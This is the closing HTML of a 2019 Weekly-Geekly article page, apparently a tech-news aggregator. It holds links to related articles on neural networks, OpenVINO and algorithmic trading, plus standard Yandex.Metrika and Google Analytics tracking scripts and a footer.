<li><a href="../434236/index.html">Amoeba neural network solved the traveling salesman problem for 8 cities</a></li>
<li><a href="../434238/index.html">Intel OpenVINO on Raspberry Pi: 2018 harvest</a></li>
<li><a href="../434244/index.html">I have an algorithm trader with my mother: we are looking for free frameworks for testing hypotheses and launching in combat mode (Python)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>